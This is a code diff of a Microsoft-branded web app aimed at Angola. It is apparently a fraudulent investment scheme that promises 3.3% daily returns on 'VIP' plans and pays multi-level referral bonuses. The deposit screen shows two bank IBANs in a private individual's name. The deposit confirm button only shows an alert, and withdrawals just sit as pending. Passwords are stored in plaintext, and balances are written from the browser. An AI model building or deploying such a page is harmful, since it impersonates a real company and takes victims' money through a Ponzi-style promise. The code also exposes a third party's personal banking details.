@@ -6,139 +6,117 @@
     <title>Microsoft Hub - Angola</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-
     <style>
         .ms-gradient { background: linear-gradient(135deg, #0078D4 0%, #005A9E 100%); }
-        .screen { display: none; padding-bottom: 80px; }
+        .screen { display: none; padding-bottom: 120px; }
         .active-screen { display: block; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .card-vip { background: white; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        .vip-table th { font-size: 9px; color: #718096; padding: 10px 5px; text-transform: uppercase; }
-        .vip-table td { font-size: 10px; padding: 12px 5px; border-bottom: 1px solid #f7fafc; text-align: center; }
+        tr:nth-child(even) { background-color: #f8fafc; }
+        .float-wa { animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
     </style>
 </head>
-<body class="bg-slate-50 text-slate-800">
+<body class="bg-slate-50 text-slate-800 font-sans">
 
     <div id="login-screen" class="fixed inset-0 z-[100] ms-gradient flex items-center justify-center p-6 text-center">
         <div class="bg-white w-full max-w-sm rounded-3xl p-8 shadow-2xl">
             <i class="fab fa-microsoft text-blue-600 text-5xl mb-4"></i>
-            <h2 class="text-xl font-black mb-6 uppercase tracking-tighter">Microsoft Hub</h2>
-            <div class="flex border-b mb-6 font-bold text-xs uppercase">
+            <h2 class="text-2xl font-black mb-1 uppercase italic text-blue-700">Microsoft Hub</h2>
+            <div class="flex border-b my-6 font-bold text-xs uppercase text-slate-400">
                 <button id="t-log" onclick="setAuth('login')" class="flex-1 pb-2 text-blue-600 border-b-2 border-blue-600">Entrar</button>
-                <button id="t-reg" onclick="setAuth('reg')" class="flex-1 pb-2 text-gray-400">Registar</button>
+                <button id="t-reg" onclick="setAuth('reg')" class="flex-1 pb-2">Registar</button>
             </div>
-            <input type="number" id="uid" placeholder="Telemóvel" class="w-full p-4 bg-slate-50 border rounded-xl mb-3 outline-none font-bold text-center">
-            <input type="password" id="upass" placeholder="Senha (8 dígitos)" class="w-full p-4 bg-slate-50 border rounded-xl mb-6 outline-none font-bold text-center">
-            <button onclick="handleAuth()" class="w-full py-4 ms-gradient text-white font-black rounded-xl shadow-lg uppercase">Aceder Conta</button>
+            <input type="number" id="uid" placeholder="Telemóvel" class="w-full p-4 bg-slate-50 border rounded-xl mb-3 outline-none font-bold text-center text-sm">
+            <input type="password" id="upass" placeholder="Senha (8 dígitos)" class="w-full p-4 bg-slate-50 border rounded-xl mb-3 outline-none font-bold text-center text-sm">
+            <input type="number" id="uref" placeholder="ID de Convite (Opcional)" class="w-full p-4 bg-blue-50 border rounded-xl mb-6 text-center text-xs font-bold text-blue-600 outline-none">
+            <button onclick="handleAuth()" id="btn-auth" class="w-full py-4 ms-gradient text-white font-black rounded-xl shadow-lg uppercase tracking-wider active:scale-95 transition-transform">Aceder</button>
         </div>
     </div>
 
-    <div id="main-app" class="hidden min-h-screen pb-24">
+    <div id="main-app" class="hidden min-h-screen">
         <header class="bg-white p-5 border-b sticky top-0 z-50 flex justify-between items-center shadow-sm">
-            <div class="font-black text-blue-700 italic">MS HUB AO</div>
-            <div id="u-display" class="text-[10px] font-black bg-blue-100 text-blue-700 px-3 py-1 rounded-full uppercase">ID: ---</div>
+            <div class="font-black text-blue-700 italic uppercase text-sm tracking-tighter">MICROSOFT HUB</div>
+            <div id="u-display" class="text-[9px] font-black bg-blue-100 text-blue-700 px-3 py-1 rounded-full italic uppercase">ID: ---</div>
         </header>
 
         <main class="p-4">
             <div id="sc-home" class="screen active-screen">
                 <div class="ms-gradient rounded-3xl p-8 text-white shadow-xl mb-6 text-center">
-                    <p class="text-[10px] font-bold opacity-70 uppercase tracking-widest text-center">Saldo Disponível</p>
-                    <h1 id="balance" class="text-4xl font-black my-2">0,00 KZ</h1>
-                    <span id="vip-status" class="text-[9px] font-black bg-black/10 px-4 py-1 rounded-full uppercase">Aguardando Ativação</span>
+                    <p class="text-[10px] font-bold opacity-70 uppercase tracking-widest text-white/80">Saldo Acumulado</p>
+                    <h1 id="balance" class="text-4xl font-black my-2 tracking-tighter text-white">0,00 KZ</h1>
+                    <span id="vip-status" class="text-[9px] font-black bg-black/20 px-4 py-1 rounded-full uppercase italic tracking-tighter text-white/90">Aguardando Ativação</span>
                 </div>
 
-                <div class="grid grid-cols-4 gap-2 mb-8 text-center font-bold">
-                    <div onclick="show('sc-dep')" class="bg-white p-3 rounded-xl shadow-sm"><i class="fas fa-university text-blue-600 mb-1"></i><p class="text-[8px] uppercase">Depósito</p></div>
-                    <div onclick="show('sc-wit')" class="bg-white p-3 rounded-xl shadow-sm"><i class="fas fa-wallet text-orange-500 mb-1"></i><p class="text-[8px] uppercase">Saque</p></div>
-                    <div onclick="show('sc-iban')" class="bg-white p-3 rounded-xl shadow-sm"><i class="fas fa-id-card text-green-600 mb-1"></i><p class="text-[8px] uppercase">IBAN</p></div>
-                    <div onclick="show('sc-team')" class="bg-white p-3 rounded-xl shadow-sm"><i class="fas fa-users text-purple-600 mb-1"></i><p class="text-[8px] uppercase">Equipa</p></div>
-                </div>
-
-                <div class="card-vip p-4">
-                    <h3 class="font-black text-[10px] mb-4 text-slate-400 uppercase border-b pb-2 text-center tracking-widest">Planos Microsoft (3.3% Diários)</h3>
-                    <div class="overflow-x-auto">
-                        <table class="vip-table w-full">
-                            <thead>
-                                <tr><th class="text-left">Nível</th><th>Diário</th><th>30 Dias</th><th>Ação</th></tr>
-                            </thead>
-                            <tbody id="v-rows"></tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
-
-            <div id="sc-team" class="screen">
-                <div class="bg-white p-6 rounded-3xl shadow-lg border">
-                    <h3 class="font-black text-center mb-6 uppercase text-blue-700 tracking-widest">Ganhos por Indicação</h3>
-                    <div class="bg-blue-50 p-4 rounded-2xl border-l-4 border-blue-600 mb-4">
-                        <div class="flex justify-between items-center mb-1"><span class="text-[11px] font-black text-blue-900 uppercase">1º Nível (Amigos)</span><span class="bg-blue-600 text-white text-[10px] px-2 py-0.5 rounded-full">10%</span></div>
-                        <p class="text-[9px] text-blue-700 leading-tight">Ganhe 10% sobre o VIP que o seu amigo direto ativar.</p>
-                    </div>
-                    <div class="bg-slate-50 p-4 rounded-2xl border-l-4 border-blue-400 mb-4">
-                        <div class="flex justify-between items-center mb-1"><span class="text-[11px] font-black text-slate-800 uppercase">2º Nível</span><span class="bg-blue-400 text-white text-[10px] px-2 py-0.5 rounded-full">4%</span></div>
-                        <p class="text-[9px] text-slate-500 leading-tight">Ganhe 4% sobre o indicado do seu amigo.</p>
-                    </div>
-                    <div class="bg-slate-50 p-4 rounded-2xl border-l-4 border-slate-300 mb-8">
-                        <div class="flex justify-between items-center mb-1"><span class="text-[11px] font-black text-slate-800 uppercase">3º Nível</span><span class="bg-slate-300 text-white text-[10px] px-2 py-0.5 rounded-full">1%</span></div>
-                        <p class="text-[9px] text-slate-500 leading-tight">Ganhe 1% no terceiro nível da sua rede.</p>
-                    </div>
-                    <p class="text-[10px] font-black text-slate-400 uppercase text-center mb-2">O seu Link de Convite</p>
-                    <div id="link-box" class="bg-slate-100 p-4 rounded-xl text-[9px] font-bold mb-4 break-all border border-dashed border-blue-300 text-center text-blue-600 italic">---</div>
-                    <button onclick="copyRef()" class="w-full py-4 ms-gradient text-white font-black rounded-xl uppercase shadow-lg mb-2">Copiar Link</button>
-                    <button onclick="show('sc-home')" class="w-full text-[10px] font-bold text-slate-300 uppercase py-2">Voltar</button>
+                <div class="bg-white rounded-2xl shadow-sm border overflow-x-auto mb-4">
+                    <table class="w-full text-left text-[10px]">
+                        <thead class="bg-slate-100 text-slate-400 uppercase font-black">
+                            <tr><th class="p-3">Plano</th><th class="p-3">Preço</th><th class="p-3">Dia</th><th class="p-3 text-center">Ação</th></tr>
+                        </thead>
+                        <tbody id="vips-table-body" class="font-bold"></tbody>
+                    </table>
                 </div>
             </div>
 
             <div id="sc-dep" class="screen">
                 <div class="bg-white p-6 rounded-3xl shadow-lg border">
-                    <h3 class="font-black text-sm mb-4 uppercase">Depósito (Mín: 5.000 KZ)</h3>
-                    <select id="d-bank" onchange="updateDep()" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 font-bold outline-none">
-                        <option value="">Selecionar Banco...</option>
-                        <option value="BAI">BANCO BAI</option>
-                        <option value="BFA">BANCO BFA</option>
-                    </select>
-                    <div id="d-info" class="hidden bg-blue-50 p-4 rounded-xl text-xs text-blue-800 mb-4 font-mono whitespace-pre-wrap border border-blue-200"></div>
-                    <input type="number" id="d-val" placeholder="Valor em KZ" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 text-center font-bold text-xl">
-                    
-                    <p class="text-[10px] font-bold text-slate-400 mb-1 uppercase text-center">Anexar Comprovativo (Foto)</p>
-                    <input type="file" id="d-proof" accept="image/*" class="text-[10px] mb-6 w-full bg-slate-100 p-2 rounded-lg">
-                    
-                    <button onclick="enviarComprovativo()" class="w-full py-4 ms-gradient text-white font-black rounded-xl uppercase shadow-lg">Confirmar Envio</button>
-                    <button onclick="show('sc-home')" class="w-full mt-4 text-[10px] font-bold text-slate-300 uppercase">Voltar</button>
+                    <h3 class="font-black text-sm mb-2 uppercase text-blue-700 italic">Depósito</h3>
+                    <div class="bg-blue-50 p-3 rounded-xl mb-4 text-[10px] font-bold text-blue-800 text-center border border-blue-100 italic">
+                        <i class="fas fa-info-circle mr-1"></i> Depósito mínimo: 5.000,00 KZ
+                    </div>
+                    <div class="grid grid-cols-2 gap-2 mb-4 font-black text-[10px]">
+                        <button onclick="setBank('BFA')" class="p-3 border rounded-xl active:bg-blue-50 uppercase">BFA Angola</button>
+                        <button onclick="setBank('BAI')" class="p-3 border rounded-xl active:bg-blue-50 uppercase">BAI Angola</button>
+                    </div>
+                    <div id="bank-info" class="hidden bg-slate-50 p-4 rounded-xl text-[10px] font-mono mb-4 border-dashed border-2 border-blue-200 text-blue-800 whitespace-pre"></div>
+                    <input type="number" id="dep-val" placeholder="Valor (KZ)" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 font-bold text-center outline-none">
+                    <p class="text-[9px] font-black text-slate-400 mb-2 uppercase text-center italic">Comprovativo:</p>
+                    <input type="file" class="w-full text-[10px] mb-6 bg-slate-100 p-2 rounded-lg">
+                    <button onclick="alert('Solicitação enviada ao Master Admin!')" class="w-full py-4 ms-gradient text-white font-black rounded-xl uppercase shadow-lg active:scale-95 transition-transform">Confirmar</button>
                 </div>
             </div>
 
             <div id="sc-wit" class="screen">
-                <div class="bg-white p-6 rounded-3xl shadow-lg border text-center">
-                    <h3 class="font-black text-sm uppercase mb-4 tracking-widest">Saque</h3>
-                    <select id="w-bank-sel" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 font-bold outline-none"></select>
-                    <input type="number" id="w-val" oninput="calcTax()" placeholder="Valor KZ" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 text-center text-2xl font-bold">
-                    <div class="bg-orange-50 p-4 rounded-xl mb-6 text-center border border-orange-100">
-                        <p class="text-[10px] font-bold text-orange-800 uppercase">Líquido (Taxa 10%): <span id="w-net" class="text-lg font-black text-orange-900">0,00 KZ</span></p>
+                <div class="bg-white p-6 rounded-3xl shadow-lg border mb-6 text-center">
+                    <h3 class="font-black text-sm mb-2 uppercase text-orange-600 italic">Saque</h3>
+                    <div class="bg-orange-50 p-3 rounded-xl mb-4 text-[10px] font-bold text-orange-800 text-center border border-orange-100 italic">
+                        <i class="fas fa-wallet mr-1"></i> Saque mínimo: 500,00 KZ
                     </div>
-                    <button onclick="execSaque()" class="w-full py-4 bg-orange-500 text-white font-black rounded-xl uppercase shadow-lg">Levantar</button>
-                    <button onclick="show('sc-home')" class="w-full mt-4 text-[10px] font-bold text-slate-300 uppercase">Voltar</button>
+                    <input type="number" id="wit-val" oninput="updateTax()" placeholder="Valor KZ" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 text-center text-2xl font-bold outline-none">
+                    <div class="bg-slate-50 p-3 rounded-xl mb-6 text-[10px] font-bold text-slate-500 italic">
+                        Recebe (Taxa 10%): <span id="net-val" class="text-orange-600 font-black">0,00 KZ</span>
+                    </div>
+                    <button onclick="execSaque()" class="w-full py-4 bg-orange-500 text-white font-black rounded-xl uppercase shadow-lg active:scale-95 transition-transform">Levantar</button>
                 </div>
+                <div id="wit-history" class="bg-white p-4 rounded-2xl shadow-sm border space-y-2 text-[10px] font-bold"></div>
             </div>
 
-            <div id="sc-iban" class="screen text-center">
-                <div class="bg-white p-6 rounded-3xl shadow-lg border">
-                    <h3 class="font-black text-sm mb-6 uppercase">Vincular Conta</h3>
-                    <select id="i-bank" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 font-bold"><option value="BAI">BAI</option><option value="BFA">BFA</option></select>
-                    <input type="text" id="i-iban" maxlength="21" placeholder="IBAN (21 Dígitos)" class="w-full p-4 bg-slate-50 border rounded-xl mb-4 text-center font-bold">
-                    <input type="text" id="i-name" placeholder="Nome Titular" class="w-full p-4 bg-slate-50 border rounded-xl mb-6 text-center font-bold uppercase">
-                    <button onclick="saveIBAN()" class="w-full py-4 bg-green-600 text-white font-black rounded-xl uppercase shadow-lg">Salvar Dados</button>
-                    <button onclick="show('sc-home')" class="w-full mt-4 text-[10px] font-bold text-slate-300 uppercase">Voltar</button>
+            <div id="sc-team" class="screen">
+                <div class="bg-white p-6 rounded-3xl shadow-lg border mb-6">
+                    <h3 class="font-black text-sm mb-4 uppercase text-purple-700 italic text-center border-b pb-2">Rede de Afiliados</h3>
+                    <div class="space-y-2 mb-6 text-[10px] font-black uppercase italic">
+                        <div class="flex justify-between p-3 bg-purple-50 rounded-xl"><span>Nível 1</span><span class="text-purple-700">10% Bónus</span></div>
+                        <div class="flex justify-between p-3 bg-slate-50 rounded-xl"><span>Nível 2</span><span>4% Bónus</span></div>
+                        <div class="flex justify-between p-3 bg-slate-50 rounded-xl"><span>Nível 3</span><span>1% Bónus</span></div>
+                    </div>
+                    <p class="text-[9px] font-bold text-slate-400 mb-2 uppercase text-center italic">Link de Convite:</p>
+                    <div id="link-box" class="bg-slate-100 p-4 rounded-xl text-[9px] font-bold mb-4 break-all border border-dashed border-purple-300 text-center text-purple-700">---</div>
+                    <button onclick="copyRef()" class="w-full py-4 bg-purple-600 text-white font-black rounded-xl uppercase shadow-lg active:scale-95 transition-transform">Copiar Link</button>
                 </div>
             </div>
         </main>
 
+        <a href="https://wa.me/244929520327?text=Olá, preciso de suporte no Microsoft Hub!" 
+           class="fixed bottom-24 right-6 bg-green-500 text-white w-14 h-14 rounded-full flex items-center justify-center shadow-2xl z-[60] active:scale-95 float-wa">
+            <i class="fab fa-whatsapp text-2xl"></i>
+        </a>
+
         <nav class="fixed bottom-0 left-0 right-0 bg-white border-t p-4 flex justify-around shadow-2xl z-50">
             <button onclick="show('sc-home')" class="text-2xl text-blue-600"><i class="fas fa-home"></i></button>
-            <button onclick="window.location.href='https://wa.me/244929520327'" class="text-2xl text-slate-400"><i class="fab fa-whatsapp"></i></button>
+            <button onclick="show('sc-dep')" class="text-2xl text-slate-400"><i class="fas fa-university"></i></button>
+            <button onclick="show('sc-team')" class="text-2xl text-slate-400"><i class="fas fa-users"></i></button>
+            <button onclick="show('sc-wit')" class="text-2xl text-slate-400"><i class="fas fa-wallet"></i></button>
             <button onclick="logout()" class="text-2xl text-red-400"><i class="fas fa-power-off"></i></button>
         </nav>
     </div>
@@ -147,6 +125,7 @@
         const firebaseConfig = {
             apiKey: "AIzaSyC3SurEz7aLcHG4yBUq5zrGBPOb2mvLpZ4",
             authDomain: "fir-6e9ec.firebaseapp.com",
+            databaseURL: "https://fir-6e9ec-default-rtdb.firebaseio.com/",
             projectId: "fir-6e9ec",
             storageBucket: "fir-6e9ec.firebasestorage.app",
             messagingSenderId: "579697818964",
@@ -155,136 +134,128 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let mode = 'login';
-        let saldo = parseFloat(localStorage.getItem('ms_saldo')) || 0;
-        let vipAtivo = localStorage.getItem('ms_vip_id') || null;
+        let authMode = 'login';
+        let saldo = 0;
+        let vipAtivo = null;
         const vips = [
             {id:1, p:5000}, {id:2, p:15000}, {id:3, p:35000}, {id:4, p:80000}, {id:5, p:150000},
             {id:6, p:300000}, {id:7, p:500000}, {id:8, p:750000}, {id:9, p:1000000}, {id:10, p:1220000}
         ];
 
         window.onload = () => {
-            const user = localStorage.getItem('ms_user');
-            if(localStorage.getItem('ms_logged')==='true') {
-                db.ref('users/' + user).on('value', snap => {
-                    const data = snap.val();
-                    if(data) {
-                        saldo = data.saldo || saldo;
-                        vipAtivo = data.vip_id || vipAtivo;
-                        updateUI();
-                    }
-                });
-                openApp();
-            }
-            renderVIPs();
+            const urlParams = new URLSearchParams(window.location.search);
+            if(urlParams.has('ref')) document.getElementById('uref').value = urlParams.get('ref');
+
+            const u = localStorage.getItem('ms_user');
+            if(localStorage.getItem('ms_logged')==='true') conectarApp(u);
+            renderVipsTable();
+            
             setInterval(() => {
                 if(vipAtivo) {
                     const v = vips.find(x => x.id == vipAtivo);
                     saldo += (v.p * 0.033) / 86400;
-                    localStorage.setItem('ms_saldo', saldo);
-                    updateUI();
-                    if(Math.floor(Date.now()/1000) % 10 === 0) syncDB();
+                    document.getElementById('balance').innerText = saldo.toLocaleString('pt-AO', {minimumFractionDigits:2}) + " KZ";
                 }
             }, 1000);
         };
 
+        function setAuth(m) {
+            authMode = m;
+            document.getElementById('t-log').className = m==='login'?'flex-1 pb-2 text-blue-600 border-b-2 border-blue-600':'flex-1 pb-2';
+            document.getElementById('t-reg').className = m==='reg'?'flex-1 pb-2 text-blue-600 border-b-2 border-blue-600':'flex-1 pb-2';
+            document.getElementById('btn-auth').innerText = m==='login'?'Aceder':'Registar Agora';
+        }
+
         function handleAuth() {
             const u = document.getElementById('uid').value;
             const s = document.getElementById('upass').value;
+            const r = document.getElementById('uref').value;
             if(!u || s.length < 8) return alert("Erro: Senha de 8 dígitos!");
-            if(mode === 'reg') {
-                db.ref('users/' + u).set({ pass: s, saldo: 0 }).then(() => { alert("Sucesso!"); setAuth('login'); });
+
+            if(authMode === 'reg') {
+                db.ref('users/' + u).set({ pass: s, saldo: 0, vip_id: null, indicado_por: r || "Ninguém" })
+                .then(() => { alert("CONTA CRIADA! Clique em Entrar."); setAuth('login'); });
             } else {
                 db.ref('users/' + u).once('value', snap => {
                     const d = snap.val();
                     if(d && d.pass === s) {
                         localStorage.setItem('ms_logged','true'); localStorage.setItem('ms_user', u);
                         location.reload();
-                    } else alert("Erro nos dados!");
+                    } else alert("Dados incorretos!");
                 });
             }
         }
 
-        function openApp() {
+        function conectarApp(u) {
             document.getElementById('login-screen').classList.add('hidden');
             document.getElementById('main-app').classList.remove('hidden');
-            const u = localStorage.getItem('ms_user');
             document.getElementById('u-display').innerText = "ID: " + u;
             document.getElementById('link-box').innerText = window.location.origin + window.location.pathname + "?ref=" + u;
-            updateUI();
-        }
 
-        function renderVIPs() {
-            let h = '';
-            vips.forEach(v => {
-                const dia = v.p * 0.033;
-                const isA = vipAtivo == v.id;
-                h += `<tr><td class="text-left font-black text-blue-900 py-4">VIP ${v.id}<br><span class="text-[8px] text-slate-400">${v.p.toLocaleString()} KZ</span></td><td class="text-green-600 font-bold">${dia.toFixed(0)}</td><td>${(dia*30).toFixed(0)}</td><td><button onclick="ativar(${v.id})" class="px-2 py-1 rounded-lg text-[8px] font-black ${isA?'bg-slate-100 text-slate-400':'bg-blue-600 text-white'}">${isA?'ATIVO':'ATIVAR'}</button></td></tr>`;
+            db.ref('users/' + u).on('value', snap => {
+                const d = snap.val();
+                if(d) {
+                    saldo = d.saldo || 0;
+                    vipAtivo = d.vip_id || null;
+                    document.getElementById('balance').innerText = saldo.toLocaleString('pt-AO', {minimumFractionDigits:2}) + " KZ";
+                    if(vipAtivo) document.getElementById('vip-status').innerText = "MICROSOFT VIP " + vipAtivo + " ATIVO";
+                    renderVipsTable();
+                }
             });
-            document.getElementById('v-rows').innerHTML = h;
+
+            db.ref('saques_pendentes').orderByChild('user').equalTo(u).on('value', snap => {
+                let h = '';
+                snap.forEach(s => {
+                    const item = s.val();
+                    h += `<div class="flex justify-between p-3 bg-slate-50 rounded-xl border"><span>${new Date(item.data).toLocaleDateString()}</span><span>${item.valor} KZ</span><span class="${item.status==='Pendente'?'text-orange-500':'text-green-500'}">${item.status}</span></div>`;
+                });
+                document.getElementById('wit-history').innerHTML = h || '<p class="text-slate-300 text-center py-4 italic">Sem registos.</p>';
+            });
         }
 
-        function updateUI() {
-            document.getElementById('balance').innerText = saldo.toLocaleString('pt-AO', {minimumFractionDigits:2}) + " KZ";
-            if(vipAtivo) document.getElementById('vip-status').innerText = "VIP " + vipAtivo + " ATIVO";
-            const b = localStorage.getItem('ms_banco');
-            document.getElementById('w-bank-sel').innerHTML = b ? `<option value="${b}">${b} (VINCULADA)</option>` : `<option value="">Vincule IBAN</option>`;
+        function renderVipsTable() {
+            let html = '';
+            vips.forEach(v => {
+                const dia = (v.p * 0.033).toFixed(0);
+                const isA = vipAtivo == v.id;
+                html += `<tr class="border-b"><td class="p-3 text-blue-700 italic">VIP ${v.id}</td><td class="p-3">${v.p.toLocaleString()}</td><td class="p-3 text-green-600">+${dia}</td><td class="p-3 text-center"><button onclick="ativarVIP(${v.id})" class="px-3 py-1 rounded-lg text-[9px] ${isA?'bg-green-100 text-green-600':'bg-blue-600 text-white shadow-md active:scale-90'}">${isA?'ATIVO':'ATIVAR'}</button></td></tr>`;
+            });
+            document.getElementById('vips-table-body').innerHTML = html;
         }
 
-        function updateDep() {
-            const b = document.getElementById('d-bank').value;
-            const i = document.getElementById('d-info');
-            if(b==='BAI') { i.innerText = "IBAN: 0040 0000 0927 0667 101 41\nASSIS BUSH SESSA"; i.classList.remove('hidden'); }
-            else if(b==='BFA') { i.innerText = "IBAN: 0006 0000 0774 9006 301 94\nASSIS BUSH SESSA"; i.classList.remove('hidden'); }
-            else i.classList.add('hidden');
+        function ativarVIP(id) {
+            const v = vips.find(x => x.id === id);
+            if(vipAtivo == id) return;
+            if(vipAtivo && id > vipAtivo) {
+                if(confirm("Fazer Upgrade? O valor do VIP anterior será reembolsado.")) {
+                    saldo += vips.find(x => x.id == vipAtivo).p;
+                } else return;
+            }
+            if(saldo < v.p) return alert("Saldo insuficiente!");
+            saldo -= v.p; vipAtivo = id;
+            db.ref('users/' + localStorage.getItem('ms_user')).update({ saldo: saldo, vip_id: vipAtivo });
+            alert("VIP " + id + " ATIVADO!");
         }
 
-        function enviarComprovativo() {
-            const v = document.getElementById('d-val').value;
-            const f = document.getElementById('d-proof').files[0];
-            if(!v || !f) return alert("Preencha o valor e anexe a foto!");
-            db.ref('depositos_pendentes').push({
-                user: localStorage.getItem('ms_user'),
-                valor: v, banco: document.getElementById('d-bank').value,
-                data: new Date().toLocaleString(), arquivo: f.name
-            }).then(() => { alert("Enviado para análise!"); show('sc-home'); });
+        function setBank(b) {
+            const info = document.getElementById('bank-info');
+            info.classList.remove('hidden');
+            info.innerText = b==='BFA' ? "IBAN BFA: 0006 0000 0774 9006 301 94\nTITULAR: ASSIS BUSH SESSA" : "IBAN BAI: 0040 0000 0927 0667 101 41\nTITULAR: ASSIS BUSH SESSA";
         }
 
-        function saveIBAN() {
-            const ib = document.getElementById('i-iban').value;
-            if(ib.length !== 21) return alert("IBAN inválido!");
-            localStorage.setItem('ms_banco', document.getElementById('i-bank').value);
-            localStorage.setItem('ms_iban', ib);
-            alert("Salvo!"); show('sc-home'); updateUI();
-        }
-
-        function calcTax() {
-            const v = parseFloat(document.getElementById('w-val').value) || 0;
-            document.getElementById('w-net').innerText = (v * 0.9).toLocaleString('pt-AO', {minimumFractionDigits:2}) + " KZ";
+        function updateTax() {
+            const v = parseFloat(document.getElementById('wit-val').value) || 0;
+            document.getElementById('net-val').innerText = (v * 0.9).toLocaleString('pt-AO', {minimumFractionDigits:2}) + " KZ";
         }
 
         function execSaque() {
-            const v = parseFloat(document.getElementById('w-val').value);
-            if(v < 500 || v > saldo) return alert("Erro!");
-            saldo -= v; syncDB(); alert("Solicitado!"); show('sc-home'); updateUI();
+            const v = parseFloat(document.getElementById('wit-val').value);
+            if(v < 500) return alert("O saque mínimo é 500 KZ!");
+            if(v > saldo) return alert("Saldo insuficiente!");
+            db.ref('saques_pendentes').push({ user: localStorage.getItem('ms_user'), valor: v, data: Date.now(), status: 'Pendente' })
+            .then(() => { saldo -= v; db.ref('users/' + localStorage.getItem('ms_user')).update({ saldo: saldo }); alert("Saque solicitado!"); show('sc-home'); });
         }
 
-        function ativar(id) {
-            const v = vips.find(x => x.id === id);
-            if(saldo < v.p) return alert("Saldo insuficiente!");
-            if(confirm(`Ativar VIP ${id}?`)) {
-                saldo -= v.p; vipAtivo = id;
-                localStorage.setItem('ms_vip_id', id); syncDB(); renderVIPs(); updateUI();
-            }
-        }
-
-        function syncDB() {
-            const u = localStorage.getItem('ms_user');
-            if(u) db.ref('users/' + u).update({ saldo: saldo, vip_id: vipAtivo });
-        }
-
-        function copyRef() { navigator.clipboard.writeText(document.getElementById('link-box').innerText).then(() => alert("Copiado!")); }
-        function setAuth(m) { mode = m; document.getElementById('t-log').className = m==='login'?'flex-1 pb-2 text-blue-600 border-b-2 border-blue-600':'flex-1 pb-2 text-gray-400'; document.getElementById('t-reg').className = m==='reg'?'flex-1 pb-2 text-blue-600 border-b-2 border-blue-600':'flex-1 pb-2 text-gray-400'; }
         function show(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); }
         function logout() { localStorage.clear(); location.reload(); }
     </script>
